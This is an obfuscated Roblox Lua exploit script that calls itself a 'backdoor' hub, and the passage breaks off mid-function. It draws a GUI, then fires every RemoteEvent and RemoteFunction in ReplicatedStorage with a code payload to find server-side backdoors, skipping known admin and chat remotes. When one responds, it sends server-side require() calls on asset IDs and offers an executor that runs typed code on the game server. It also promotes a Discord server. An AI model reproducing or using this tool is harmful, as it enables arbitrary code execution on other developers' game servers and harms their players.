
local qb,x,A=pairs,type,getmetatable;
local ma={};
print('Made by zazol1\49')
ma['1']=Instance.new('ScreenGui',game.GetService(game,'CoreGui').WaitForChild(game.GetService(game,'CoreGui'),'RobloxGui'));
ma['1']['Name']='zazol6\54\54 private';
ma['1']['ZIndexBehavior']=Enum.ZIndexBehavior.Sibling;
ma['1']['ResetOnSpawn']=false;
ma['2']=Instance.new('Frame',ma['1']);
ma['2']['BackgroundColor3']=Color3 .fromRGB(0,0,0);
ma['2']['Size']=UDim2 .new(0,482,0,276);
ma['2']['Position']=UDim2 .new(0.27320125699043274,0,0.30185979604721069,0);
ma['3']=Instance.new('UIStroke',ma['2']);
ma['3']['Color']=Color3 .fromRGB(255,255,255);
ma['3']['Thickness']=2;
ma['4']=Instance.new('UIGradient',ma['3']);
ma['4']['Rotation']=50;
ma['4']['Color']=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3 .fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3 .fromRGB(200,200,200))});
local function nb(gc)
    local ta,Db,Ha,Q,ja,Y,zb
    zb,Db={[15260]=-3920,[-24089]=14110,[597]=-549,[32750]=30749,[-31618]=12109,[-9259]=-17458,[-29682]=-28476},function(Wb)
        return zb[Wb-18469]
    end
    ta=Db(-11213)
    repeat
        while true do
            if ta==22087 then
                ta=Db(33729);
                break;
            elseif ta==-17458 then
                if true then
                    ta=25378
                else
                    ta=22087
                end
            elseif ta==25378 then
                ja,Ha,Y=0,0.02,1
                ta=5755
            elseif ta==30749 then
                gc.Offset=Vector2 .new(Q,0)
                wait(0.029999999999999999)
                ta=Db(-5620)
            elseif ta==5755 then
                Q=ja;
                if Y~=Y then
                    ta=12109
                else
                    ta=Db(19066)
                end
            elseif ta==-28476 then
                ta=-17458;
            elseif ta==-549 then
                if(Ha>=0 and ja>Y)or((Ha<0 or Ha~=Ha)and ja<Y)then
                    ta=Db(-13149)
                else
                    ta=Db(51219)
                end
            elseif ta==12109 then
                ta=Db(9210)
            elseif ta==14110 then
                ja=ja+Ha;
                Q=ja;
                if ja~=ja then
                    ta=12109
                else
                    ta=-549
                end
            end
        end
    until ta==-3920
end
coroutine.wrap(nb)(ma['4'])
ma['5']=Instance.new('UICorner',ma['2']);
ma['5']['CornerRadius']=UDim.new(0,12);
ma['6']=Instance.new('Folder',ma['2']);
ma['6']['Name']='Executor';
ma['7']=Instance.new('Frame',ma['6']);
ma['7']['BackgroundColor3']=Color3 .fromRGB(0,0,0);
ma['7']['BackgroundTransparency']=1;
ma['7']['Size']=UDim2 .new(0,290,0,28);
ma['7']['Position']=UDim2 .new(0.021699834614992142,0,0.87081092596054077,0);
ma['7']['Name']='Execute';
ma['8']=Instance.new('TextButton',ma['7']);
ma['8']['BackgroundColor3']=Color3 .fromRGB(255,255,255);
ma['8']['TextSize']=22;
ma['8']['FontFace']=Font.new('rbxasset://fonts/families/Michroma.json',Enum.FontWeight.Bold,Enum.FontStyle.Normal);
ma['8']['TextColor3']=Color3 .fromRGB(255,255,255);
ma['8']['Size']=UDim2 .new(1,0,1,0);
ma['8']['Name']='Button';
ma['8']['Text']='Exe';
ma['8']['BackgroundTransparency']=1;
ma['9']=Instance.new('UICorner',ma['7']);
ma['9']['CornerRadius']=UDim.new(0,8);
ma['a']=Instance.new('UIStroke',ma['7']);
ma['a']['Color']=Color3 .fromRGB(255,255,255);
ma['a']['Thickness']=1.5;
ma['b']=Instance.new('Frame',ma['6']);
ma['b']['BackgroundColor3']=Color3 .fromRGB(0,0,0);
ma['b']['BackgroundTransparency']=1;
ma['b']['Size']=UDim2 .new(0,162,0,28);
ma['b']['Position']=UDim2 .new(0.64005827903747559,0,0.87081098556518555,0);
ma['b']['Name']='Clear';
ma['c']=Instance.new('TextButton',ma['b']);
ma['c']['BackgroundColor3']=Color3 .fromRGB(0,0,0);
ma['c']['TextSize']=22;
ma['c']['FontFace']=Font.new('rbxasset://fonts/families/Michroma.json',Enum.FontWeight.Bold,Enum.FontStyle.Normal);
ma['c']['TextColor3']=Color3 .fromRGB(255,255,255);
ma['c']['Size']=UDim2 .new(1,0,1,0);
ma['c']['Name']='Button';
ma['c']['Text']='Clear';
ma['c']['BackgroundTransparency']=1;
ma['d']=Instance.new('UICorner',ma['b']);
ma['d']['CornerRadius']=UDim.new(0,8);
ma['e']=Instance.new('UIStroke',ma['b']);
ma['e']['Color']=Color3 .fromRGB(255,255,255);
ma['e']['Thickness']=1.5;
ma['f']=Instance.new('Frame',ma['6']);
ma['f']['BackgroundColor3']=Color3 .fromRGB(255,255,255);
ma['f']['Size']=UDim2 .new(0,462,0,163);
ma['f']['Position']=UDim2 .new(0.019629072397947311,0,0.24310137331485748,0);
ma['f']['Name']='ExecutorBox';
ma['1\48']=Instance.new('UICorner',ma['f']);
ma['1\48']['CornerRadius']=UDim.new(0,12);
ma['1\49']=Instance.new('TextBox',ma['f']);
ma['1\49']['TextSize']=14;
ma['1\49']['TextXAlignment']=Enum.TextXAlignment.Left;
ma['1\49']['TextWrapped']=true;
ma['1\49']['TextYAlignment']=Enum.TextYAlignment.Top;
ma['1\49']['BackgroundColor3']=Color3 .fromRGB(0,0,0);
ma['1\49']['TextColor3']=Color3 .fromRGB(0,0,0);
ma['1\49']['FontFace']=Font.new('rbxasset://fonts/families/Michroma.json',Enum.FontWeight.Bold,Enum.FontStyle.Normal);
ma['1\49']['MultiLine']=true;
ma['1\49']['BackgroundTransparency']=1;
ma['1\49']['PlaceholderText']='require(3\51\51\51\51\51\51):realLeak()';
ma['1\49']['Size']=UDim2 .new(0,448,0,150);
ma['1\49']['Text']='require(0x8\54bc8a2\52\54\53\55a+0x1\51e8\57bd9*-0x1\57\48a5+-0x1bf1\55\52b3\50b0d)()';
ma['1\49']['Position']=UDim2 .new(0.015692640095949173,0,0.042270027101039886,0);
ma['1\49']['ClearTextOnFocus']=false;
local function ga(jb,n)
    local ka,Qa,f,Ub,Bb,Ga,ib
    ib,Ub={[31651]=21533,[-24055]=-31280,[-25554]=31668,[-2820]=-31169,[9596]=-28267,[4323]=-7431,[3561]=-26793,[8160]=31668,[-3246]=-31169,[-7479]=-6376},function(j)
        return ib[j- -20046]
    end
    Ga=Ub(-27525)
    repeat
        while true do
            if Ga==-31169 then
                if(ka>=0 and Qa>Bb)or((ka<0 or ka~=ka)and Qa<Bb)then
                    Ga=Ub(-11886)
                else
                    Ga=-161
                end
            elseif Ga==-7431 then
                if true then
                    Ga=-13089
                else
                    Ga=Ub(11605)
                end
            elseif Ga==-28267 then
                Qa=Qa+ka;
                f=Qa;
                if Qa~=Qa then
                    Ga=31668
                else
                    Ga=Ub(-23292)
                end
            elseif Ga==-13089 then
                ka,Bb,Qa=1,#n,1
                Ga=Ub(-16485)
            elseif Ga==-6376 then
                Ga=-7431;
            elseif Ga==-26793 then
                f=Qa;
                if Bb~=Bb then
                    Ga=Ub(-45600)
                else
                    Ga=Ub(-22866)
                end
            elseif Ga==31668 then
                wait(3)
                jb.PlaceholderText=''
                Ga=Ub(-15723)
            elseif Ga==-161 then
                jb.PlaceholderText=string.sub(n,1,f)
                wait(0.10000000000000001)
                Ga=Ub(-10450)
            elseif Ga==21533 then
                Ga=Ub(-44101);
                break;
            end
        end
    until Ga==-31280
end
coroutine.wrap(ga)(ma['1\49'],'require(3\51\51\51\51):zazolGod')
ma['1\50']=Instance.new('LocalScript',ma['1\49']);
ma['1\50']['Name']='Highlight';
ma['1\51']=Instance.new('ModuleScript',ma['1\50']);
ma['1\51']['Name']='Highlighter';
ma['1\52']=Instance.new('ModuleScript',ma['1\51']);
ma['1\52']['Name']='lexer';
ma['1\53']=Instance.new('ModuleScript',ma['1\52']);
ma['1\53']['Name']='language';
ma['1\54']=Instance.new('Frame',ma['2']);
ma['1\54']['BackgroundColor3']=Color3 .fromRGB(255,255,255);
ma['1\54']['BackgroundTransparency']=1;
ma['1\54']['Size']=UDim2 .new(0,370,0,107);
ma['1\54']['Position']=UDim2 .new(0.1166670024394989,0,0.30478382110595703,0);
ma['1\54']['Visible']=false;
ma['1\54']['Name']='Scanner';
ma['1\55']=Instance.new('UIStroke',ma['1\54']);
ma['1\55']['Color']=Color3 .fromRGB(255,255,255);
ma['1\55']['Thickness']=2;
ma['1\56']=Instance.new('UIGradient',ma['1\55']);
ma['1\56']['Rotation']=50;
ma['1\56']['Color']=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3 .fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3 .fromRGB(200,200,200))});
coroutine.wrap(nb)(ma['1\56'])
ma['1\57']=Instance.new('UICorner',ma['1\54']);
ma['1\57']['CornerRadius']=UDim.new(0,12);
ma['1a']=Instance.new('TextButton',ma['1\54']);
ma['1a']['BackgroundColor3']=Color3 .fromRGB(255,255,255);
ma['1a']['TextSize']=43;
ma['1a']['FontFace']=Font.new('rbxasset://fonts/families/Michroma.json',Enum.FontWeight.Bold,Enum.FontStyle.Normal);
ma['1a']['TextColor3']=Color3 .fromRGB(0,0,0);
ma['1a']['Size']=UDim2 .new(1,0,1,0);
ma['1a']['Name']='Button';
ma['1a']['Text']='Start Scanning';
ma['1a']['BackgroundTransparency']=1;
ma['1b']=Instance.new('UIGradient',ma['1a']);
ma['1b']['Rotation']=50;
ma['1b']['Color']=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3 .fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3 .fromRGB(200,200,200))});
coroutine.wrap(nb)(ma['1b'])
ma['1c']=Instance.new('UIStroke',ma['1a']);
ma['1c']['Color']=Color3 .fromRGB(255,255,255);
ma['1c']['Thickness']=1.5;
ma['1d']=Instance.new('TextLabel',ma['2']);
ma['1d']['BackgroundColor3']=Color3 .fromRGB(255,255,255);
ma['1d']['FontFace']=Font.new('rbxasset://fonts/families/Michroma.json',Enum.FontWeight.Bold,Enum.FontStyle.Normal);
ma['1d']['TextSize']=49;
ma['1d']['TextColor3']=Color3 .fromRGB(0,0,0);
ma['1d']['Size']=UDim2 .new(0,460,0,50);
ma['1d']['Text']='zazol hub private';
ma['1d']['BackgroundTransparency']=1;
ma['1d']['Position']=UDim2 .new(0.021699834614992142,0,0.025362318381667137,0);
ma['1e']=Instance.new('UIStroke',ma['1d']);
ma['1e']['Color']=Color3 .fromRGB(255,255,255);
ma['1e']['Thickness']=3;
ma['1f']=Instance.new('UIGradient',ma['1e']);
ma['1f']['Rotation']=50;
ma['1f']['Color']=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3 .fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3 .fromRGB(200,200,200))});
coroutine.wrap(nb)(ma['1f'])
ma['2\48']=Instance.new('LocalScript',ma['1']);
ma['2\49']=Instance.new('LocalScript',ma['1']);
ma['2\49']['Name']='Dragify';
local T,E=require,{};
E[ma['1\53']]={Closure=function()
    local Ia,aa,bb,cc,H,ac,Ab,Wa,O,wa,tb,K
    ac,bb={[-1124]=-27889,[6191]=-11390,[-5452]=-8442,[-9987]=29447,[-2245]=-29266,[29412]=5313,[-29178]=-317,[-30778]=-317,[-16006]=647,[29497]=-8442,[20004]=24894},function(sa)
        return ac[sa+-30637]
    end
    aa=bb(50641)
    repeat
        while true do
            if aa==5313 then
                O[tostring(tb)]='Enum'
                aa=bb(60134)
            elseif aa==-8442 then
                Ia,tb=Ab(Wa,K);
                K=Ia;
                if K==nil then
                    aa=bb(36828)
                else
                    aa=bb(60049)
                end
            elseif aa==-27889 then
                Ab,Wa,K=qb(Ab)
                aa=bb(-141)
            elseif aa==24894 then
                wa=ma['1\53']
                H={keyword={['and']='keyword',['break']='keyword',['continue']='keyword',['do']='keyword',['else']='keyword',['elseif']='keyword',['end']='keyword',['export']='keyword',['false']='keyword',['for']='keyword',['function']='keyword',['if']='keyword',['in']='keyword',['local']='keyword',['nil']='keyword',['not']='keyword',['or']='keyword',['repeat']='keyword',['return']='keyword',['self']='keyword',['then']='keyword',['true']='keyword',['type']='keyword',['typeof']='keyword',['until']='keyword',['while']='keyword'},builtin={['assert']='function',['error']='function',['getfenv']='function',['getmetatable']='function',['ipairs']='function',['loadstring']='function',['newproxy']='function',['next']='function',['pairs']='function',['pcall']='function',['print']='function',['rawequal']='function',['rawget']='function',['rawlen']='function',['rawset']='function',['select']='function',['setfenv']='function',['setmetatable']='function',['tonumber']='function',['tostring']='function',['unpack']='function',['xpcall']='function',['collectgarbage']='function',['_G']='table',['_VERSION']='string',['bit3\50']='table',['coroutine']='table',['debug']='table',['math']='table',['os']='table',['string']='table',['table']='table',['utf8']='table',['DebuggerManager']='function',['delay']='function',['gcinfo']='function',['PluginManager']='function',['require']='function',['settings']='function',['spawn']='function',['tick']='function',['time']='function',['UserSettings']='function',['wait']='function',['warn']='function',['Delay']='function',['ElapsedTime']='function',['elapsedTime']='function',['printidentity']='function',['Spawn']='function',['Stats']='function',['stats']='function',['Version']='function',['version']='function',['Wait']='function',['ypcall']='function',['game']='Instance',['plugin']='Instance',['script']='Instance',['shared']='Instance',['workspace']='Instance',['Game']='Instance',['Workspace']='Instance',['Axes']='table',['BrickColor']='table',['CatalogSearchParams']='table',['CFrame']='table',['Color3']='table',['ColorSequence']='table',['ColorSequenceKeypoint']='table',['DateTime']='table',['DockWidgetPluginGuiInfo']='table',['Enum']='table',['Faces']='table',['FloatCurveKey']='table',['Font']='table',['Instance']='table',['NumberRange']='table',['NumberSequence']='table',['NumberSequenceKeypoint']='table',['OverlapParams']='table',['PathWaypoint']='table',['PhysicalProperties']='table',['Random']='table',['Ray']='table',['RaycastParams']='table',['Rect']='table',['Region3']='table',['Region3int1\54']='table',['RotationCurveKey']='table',['task']='table',['TweenInfo']='table',['UDim']='table',['UDim2']='table',['Vector2']='table',['Vector2int1\54']='table',['Vector3']='table',['Vector3int1\54']='table'},libraries={bit32={arshift='function',band='function',bnot='function',bor='function',btest='function',bxor='function',countlz='function',countrz='function',extract='function',lrotate='function',lshift='function',replace='function',rrotate='function',rshift='function'},coroutine={close='function',create='function',isyieldable='function',resume='function',running='function',status='function',wrap='function',yield='function'},debug={dumpheap='function',info='function',loadmodule='function',profilebegin='function',profileend='function',resetmemorycategory='function',setmemorycategory='function',traceback='function'},math={abs='function',acos='function',asin='function',atan2='function',atan='function',ceil='function',clamp='function',cos='function',cosh='function',deg='function',exp='function',floor='function',fmod='function',frexp='function',ldexp='function',log10='function',log='function',max='function',min='function',modf='function',noise='function',pow='function',rad='function',random='function',randomseed='function',round='function',sign='function',sin='function',sinh='function',sqrt='function',tan='function',tanh='function',huge='number',pi='number'},os={clock='function',date='function',difftime='function',time='function'},string={byte='function',char='function',find='function',format='function',gmatch='function',gsub='function',len='function',lower='function',match='function',pack='function',packsize='function',rep='function',reverse='function',split='function',sub='function',unpack='function',upper='function'},table={clear='function',clone='function',concat='function',create='function',find='function',foreach='function',foreachi='function',freeze='function',getn='function',insert='function',isfrozen='function',maxn='function',move='function',pack='function',remove='function',sort='function',unpack='function'},utf8={char='function',codepoint='function',codes='function',graphemes='function',len='function',nfcnormalize='function',nfdnormalize='function',offset='function',charpattern='string'},Axes={new='function'},BrickColor={Black='function',Blue='function',DarkGray='function',Gray='function',Green='function',new='function',New='function',palette='function',Random='function',random='function',Red='function',White='function',Yellow='function'},CatalogSearchParams={new='function'},CFrame={Angles='function',fromAxisAngle='function',fromEulerAngles='function',fromEulerAnglesXYZ='function',fromEulerAnglesYXZ='function',fromMatrix='function',fromOrientation='function',lookAt='function',new='function',identity='CFrame'},Color3={fromHex='function',fromHSV='function',fromRGB='function',new='function',toHSV='function'},ColorSequence={new='function'},ColorSequenceKeypoint={new='function'},DateTime={fromIsoDate='function',fromLocalTime='function',fromUniversalTime='function',fromUnixTimestamp='function',fromUnixTimestampMillis='function',now='function'},DockWidgetPluginGuiInfo={new='function'},Enum={},Faces={new='function'},FloatCurveKey={new='function'},Font={fromEnum='function',fromId='function',fromName='function',new='function'},Instance={new='function'},NumberRange={new='function'},NumberSequence={new='function'},NumberSequenceKeypoint={new='function'},OverlapParams={new='function'},PathWaypoint={new='function'},PhysicalProperties={new='function'},Random={new='function'},Ray={new='function'},RaycastParams={new='function'},Rect={new='function'},Region3={new='function'},Region3int16={new='function'},RotationCurveKey={new='function'},task={cancel='function',defer='function',delay='function',desynchronize='function',spawn='function',synchronize='function',wait='function'},TweenInfo={new='function'},UDim={new='function'},UDim2={fromOffset='function',fromScale='function',new='function'},Vector2={new='function',one='Vector2',xAxis='Vector2',yAxis='Vector2',zero='Vector2'},Vector2int16={new='function'},Vector3={fromAxis='function',FromAxis='function',fromNormalId='function',FromNormalId='function',new='function',one='Vector3',xAxis='Vector3',yAxis='Vector3',zAxis='Vector3',zero='Vector3'},Vector3int16={new='function'}}}
                O=H.libraries.Enum
                Ab,Wa,K=ipairs(Enum.GetEnums(Enum))
                if x(Ab)~='function'then
                    aa=bb(20650)
                    break
                end
                aa=-29266
            elseif aa==-29266 then
                aa=bb(25185);
            elseif aa==647 then
                Ab,Wa,K=cc.__iter(Ab)
                aa=bb(1459)
            elseif aa==29447 then
                cc=A(Ab)
                if cc~=nil and cc.__iter~=nil then
                    aa=bb(14631)
                    break
                elseif x(Ab)=='table'then
                    aa=bb(29513)
                    break
                end
                aa=-317
            elseif aa==-317 then
                aa=bb(28392)
            elseif aa==-11390 then
                return H
            end
        end
    until aa==24355
end};
local function kb()
    local hb,Ra,w,ya,pb
    Ra,w={[2792]=-19016,[9617]=-26849},function(Ea)
        return Ra[Ea- -5576]
    end
    pb=w(4041)
    repeat
        while true do
            if pb==-26849 then
                ya=ma['1\50']
                hb=require(ya.Highlighter)
                hb.highlight({textObject=ya.Parent})
                textbox=ya.Parent
                textbox.InputChanged.Connect(textbox.InputChanged,function()
                    local va,Kb,fb
                    va,fb={[-11540]=15943,[-12661]=27834,[3114]=4843,[32658]=10404},function(dc)
                        return va[dc+-2586]
                    end
                    Kb=fb(35244)
                    repeat
                        while true do
                            if Kb==10404 then
                                if textbox.Text~=''then
                                    Kb=fb(-8954)
                                    break
                                end
                                Kb=4843
                            elseif Kb==15943 then
                                textbox.TextTransparency=1
                                return
                            elseif Kb==4843 then
                                textbox.TextTransparency=0
                                Kb=fb(-10075)
                                break
                            end
                        end
                    until Kb==27834
                end)
                pb=w(-2784)
                break
            end
        end
    until pb==-19016
end;
task.spawn(kb);
local function Gb()
    local P=ma['2\48'];
    queueteleport=(syn and syn.queue_on_teleport)or queue_on_teleport or(fluxus and fluxus.queue_on_teleport)
    GUI=P.Parent.Frame
    alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
    backdoor=nil
    HttpService=game.GetService(game,'HttpService')
    function debug(cb,ba)
        local qa,Ua,g,rb
        g,rb={[-31805]=11173,[20310]=-14149,[20401]=6162,[-29284]=-3191,[-6576]=-28836,[30369]=7947,[-8231]=-28836,[10625]=-20211,[-21818]=536},function(ec)
            return g[ec- -20636]
        end
        Ua=rb(-42454)
        repeat
            while true do
                if Ua==-20211 then
                    if ba==2 then
                        Ua=rb(-235)
                        break
                    end
                    Ua=rb(-28867)
                elseif Ua==7947 then
                    qa=warn
                    Ua=rb(-49920)
                elseif Ua==6162 then
                    qa=error
                    Ua=rb(-27212)
                elseif Ua==11173 then
                    qa=print
                    Ua=rb(-10011)
                elseif Ua==-28836 then
                    if ba==3 then
                        Ua=rb(9733)
                        break
                    end
                    Ua=-3191
                elseif Ua==536 then
                    qa=print
                    if ba==1 then
                        Ua=rb(-52441)
                        break
                    end
                    Ua=-20211
                elseif Ua==-3191 then
                    qa('zazol6\54\54 hub SS: '..cb)
                    Ua=rb(-326)
                    break
                end
            end
        until Ua==-14149
    end
    function runRemote(Eb,sb,M)
        local Pb,Sa,ab
        Pb,Sa={[2470]=16061,[27363]=1621,[21658]=1621,[-15307]=782,[-27873]=1621,[29183]=22903,[-31555]=-19170},function(Qb)
            return Pb[Qb+27057]
        end
        ab=Sa(-58612)
        repeat
            while true do
                if ab==-19170 then
                    if Eb.IsA(Eb,'RemoteEvent')then
                        ab=Sa(-24587)
                        break
                    elseif Eb.IsA(Eb,'RemoteFunction')then
                        ab=Sa(-42364)
                        break
                    end
                    ab=Sa(-5399)
                elseif ab==16061 then
                    Eb.FireServer(Eb,sb)
                    ab=Sa(-54930)
                elseif ab==782 then
                    spawn(function()
                        Eb.InvokeServer(Eb,sb)
                    end)
                    ab=Sa(306)
                elseif ab==1621 then
                    ab=Sa(2126);
                    break;
                end
            end
        until ab==22903
    end
    function makeVisible(Fa,B)
        local Nb,Ja,r,c,Xa,vb,U,e,Lb
        Lb,e={[11265]=23100,[26369]=-23214,[23261]=-23214,[2835]=19092,[24649]=-9629,[-19088]=23100,[18716]=29879,[14378]=-23214,[19693]=-24230,[5832]=18814,[7081]=11123,[3461]=-12927,[-12645]=19092,[-24526]=32445,[-14194]=-1069},function(Fb)
            return Lb[Fb- -23130]
        end
        Nb=e(-37324)
        repeat
            while true do
                if Nb==-9629 then
                    if vb.IsA(vb,'Frame')then
                        Nb=e(-19669)
                        break
                    end
                    Nb=e(-42218)
                elseif Nb==-12927 then
                    vb.Visible=B
                    Nb=e(-11865)
                elseif Nb==32445 then
                    U=A(r)
                    if U~=nil and U.__iter~=nil then
                        Nb=e(-16049)
                        break
                    elseif x(r)=='table'then
                        Nb=e(-3437)
                        break
                    end
                    Nb=e(131)
                elseif Nb==-1069 then
                    r,Ja,Xa=Fa.GetDescendants(Fa)
                    if x(r)~='function'then
                        Nb=e(-47656)
                        break
                    end
                    Nb=29879
                elseif Nb==-23214 then
                    Nb=e(-4414)
                elseif Nb==23100 then
                    Nb=e(-35775)
                elseif Nb==11123 then
                    r,Ja,Xa=U.__iter(r)
                    Nb=e(-8752)
                elseif Nb==-24230 then
                    r,Ja,Xa=qb(r)
                    Nb=e(3239)
                elseif Nb==9841 then
                    Nb=e(-17298);
                    break;
                elseif Nb==19092 then
                    c,vb=r(Ja,Xa);
                    Xa=c;
                    if Xa==nil then
                        Nb=9841
                    else
                        Nb=e(1519)
                    end
                elseif Nb==29879 then
                    Nb=e(-20295);
                end
            end
        until Nb==18814
    end
    function notify(Na)
        game.GetService(game,'StarterGui').SetCore(game.GetService(game,'StarterGui'),'SendNotification',{Title='zazol6\54\54 backdoor',Duration=6,Text=Na..' https://discord.gg/HzX2kxE3qq'})
    end
    makeVisible(GUI,false)
    GUI.Scanner.Visible=true
    GUI.Visible=true
    function generateName(Mb)
        local Ob,yb,Sb,v,pa,o,Ta,lb
        yb,o={[-30832]=-11459,[1978]=-11318,[-782]=19151,[30864]=-2318,[-2988]=-7016},function(Xb)
            return yb[Xb+-14376]
        end
        Ob=o(11388)
        repeat
            while true do
                if Ob==-2318 then
                    Sb=Sb+Ta;
                    v=Sb;
                    if Sb~=Sb then
                        Ob=-11318
                    else
                        Ob=-11459
                    end
                elseif Ob==-28060 then
                    v=Sb;
                    if pa~=pa then
                        Ob=o(16354)
                    else
                        Ob=o(-16456)
                    end
                elseif Ob==19151 then
                    lb=lb..alphabet[math.random(1,#alphabet)]
                    Ob=o(45240)
                elseif Ob==-11459 then
                    if(Ta>=0 and Sb>pa)or((Ta<0 or Ta~=Ta)and Sb<pa)then
                        Ob=-11318
                    else
                        Ob=o(13594)
                    end
                elseif Ob==-7016 then
                    lb=''
                    Sb,Ta,pa=1,1,Mb
                    Ob=-28060
                elseif Ob==-11318 then
                    return lb
                end
            end
        until Ob==5886
    end
    local t
    function findRemote()
        local b,S,q=os.clock(),{},game.GetService(game,'ReplicatedStorage').FindFirstChild(game.GetService(game,'ReplicatedStorage'),'lh'..game.PlaceId/6666*1337*game.PlaceId)
        if not(q and q.IsA(q,'RemoteFunction'))then
        else
            local mc,Oa,Ca
            Oa,mc={[-29325]=-18084,[30954]=16163},function(hc)
                return Oa[hc+23524]
            end
            Ca=mc(7430)
            repeat
                while true do
                    if Ca==16163 then
                        while true do
                            t=generateName(math.random(12,30))
                            if not(not S[t])then
                            else
                                break
                            end
                        end
                        spawn(function()
                            q.InvokeServer(q,'fd',"a=Instance.new(\'Model\',workspace)a.Name=\'"..t.."\'")
                        end)
                        S[t]=q
                        Ca=mc(-52849)
                        break
                    end
                end
            until Ca==-18084
        end
        for R,a in game.GetDescendants(game)do
            if not a.IsA(a,'RemoteEvent')then
                if not a.IsA(a,'RemoteFunction')then
                    continue
                end
            end
            if string.split(a.GetFullName(a),'.')[1]=='RobloxReplicatedStorage'then
                debug('Roblox Replicated Storage ('..a.Name..')',1)
                continue
            end
            if not(a.Parent==game.GetService(game,'ReplicatedStorage')or a.Parent.Parent==game.GetService(game,'ReplicatedStorage')or a.Parent.Parent.Parent==game.GetService(game,'ReplicatedStorage'))then
            else
                if a.FindFirstChild(a,'__FUNCTION')or a.Name=='__FUNCTION'then
                    debug('Adonis filter detected ('..a.Name..')',1)
                    continue
                end
                if a.Parent.Parent.Name=='HDAdminClient'and a.Parent.Name=='Signals'then
                    debug('HD Admin ('..a.Name..')',1)
                    continue
                end
                if a.Parent.Name=='DefaultChatSystemChatEvents'then
                    debug('Chat event ('..a.Name..')',1)
                    continue
                end
            end
            while true do
                t=generateName(math.random(12,30))
                if not S[t]then
                    break
                end
            end
            runRemote(a,"a=Instance.new(\'Model\',workspace)a.Name=\'"..t.."\'")
            S[t]=a
            debug('backdoored \"'..a.GetFullName(a)..'\"',1)
        end
        for za=1,100 do
            local Zb,Yb,L,N,oa,Ka,ra,eb,_c,y
            ra,oa={[-19412]=3204,[2515]=-6634,[-32598]=-16885,[-17190]=13576,[-8932]=-228,[-15215]=17426,[4518]=13576,[-28416]=13158,[12265]=19530,[1272]=24275,[30454]=-9673,[19894]=24275,[-17279]=-5807},function(gb)
                return ra[gb-541]
            end
            eb=oa(-16738)
            repeat
                while true do
                    if eb==-16885 then
                        eb=oa(-18871)
                    elseif eb==-6634 then
                        notify('BACKDOOR EZ '..os.clock()-b)
                        backdoor=Yb
                        debug(Yb.GetFullName(Yb),3)
                        GUI.Scanner.Visible=false
                        makeVisible(GUI.Executor,true)
                        runRemote(backdoor,'require(0x6bd1db4f3\54c0)')
                        runRemote(backdoor,'require(0x7\54\55\57\48\53\53f8\51\49\48)')
                        return true
                    elseif eb==19530 then
                        L,y,N=qb(L)
                        eb=oa(20435)
                    elseif eb==-5807 then
                        L,y,N=S
                        if x(L)~='function'then
                            eb=oa(-14674)
                            break
                        end
                        eb=oa(5059)
                    elseif eb==11125 then
                        wait()
                        eb=oa(-8391)
                        break
                    elseif eb==13158 then
                        _c=Zb
                        if workspace.FindFirstChild(workspace,_c)then
                            eb=oa(3056)
                            break
                        end
                        eb=-16885
                    elseif eb==17426 then
                        Ka=A(L)
                        if Ka~=nil and Ka.__iter~=nil then
                            eb=oa(30995)
                            break
                        elseif x(L)=='table'then
                            eb=oa(12806)
                            break
                        end
                        eb=24275
                    elseif eb==-9673 then
                        L,y,N=Ka.__iter(L)
                        eb=oa(1813)
                    elseif eb==24275 then
                        eb=oa(-16649)
                    elseif eb==13576 then
                        eb=3204;
                    elseif eb==3204 then
                        Zb,Yb=L(y,N);
                        N=Zb;
                        if N==nil then
                            eb=11125
                        else
                            eb=oa(-27875)
                        end
                    end
                end
            until eb==-228
        end
        return false
    end
    local jc=false
    GUI.Executor.Execute.Button.MouseButton1Click.Connect(GUI.Executor.Execute.Button.MouseButton1Click,function()
        local u,Rb=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text,'%%username%%',game.GetService(game,'Players').LocalPlayer.Name)
        if not jc then
            local kc,ub,i,s
            s,i={[22634]=-22591,[-2833]=-22591,[25244]=-11959,[16386]=15008,[22468]=16753},function(Ib)
                return s[Ib+-4580]
            end
            kc=i(27048)
            repeat
                while true do
                    if kc==-22591 then
                        kc=i(29824);
                        break;
                    elseif kc==16753 then
                        ub=game.GetService(game,'ReplicatedStorage').FindFirstChild(game.GetService(game,'ReplicatedStorage'),'lh'..game.PlaceId/6666*1337*game.PlaceId)
                        if ub and ub.IsA(ub,'RemoteFunction')then
                            kc=i(20966)
                            break
                        end
                        kc=i(27214)
                    elseif kc==15008 then
                        debug('Protected backdoor found',3)
                        jc=true
                        kc=i(1747)
                    end
                end
            until kc==-11959
        end
        if not(jc)then
            runRemote(backdoor,u)
        else
            local d,la,La
            la,d={[-16469]=12603,[20688]=-13290},function(ia)
                return la[ia+17073]
            end
            La=d(3615)
            repeat
                while true do
                    if La==-13290 then
                        spawn(function()
                            local na,Za,_a,Da,lc,V
                            lc,_a={[32237]=4950,[3631]=116,[11438]=-3438,[14299]=30651},function(ua)
                                return lc[ua- -27885]
                            end
                            Za=_a(-13586)
                            repeat
                                while true do
                                    if Za==30651 then
                                        na,Da=pcall(function()
                                            return protected_backdoor.InvokeServer(protected_backdoor,'zaza hub join today!!!! discord.gg/HzX2kxE3qq',u)
                                        end)
                                        if Da~=nil then
                                            Za=_a(-16447)
                                            break
                                        end
                                        Za=116
                                    elseif Za==116 then
                                        Za=_a(4352);
                                        break;
                                    elseif Za==-3438 then
                                        V=string.split(Da,':')
                                        notify(V[#V])
                                        Za=_a(-24254)
                                    end
                                end
                            until Za==4950
                        end)
                        La=d(-33542)
                        break
                    end
                end
            until La==12603
        end
        GUI.Executor.Execute.Button.Text='successfully'
        notify('successfully executed '..GUI.Executor.ExecutorBox.TextBox.Text..'s')
        wait(0.5)
        GUI.Executor.Execute.Button.Text='Exe'
    end)
    GUI.Executor.Clear.Button.MouseButton1Click.Connect(GUI.Executor.Clear.Button.MouseButton1Click,function()
        GUI.Executor.ExecutorBox.TextBox.Text=''
        GUI.Executor.Clear.Button.Text='Cleared!'
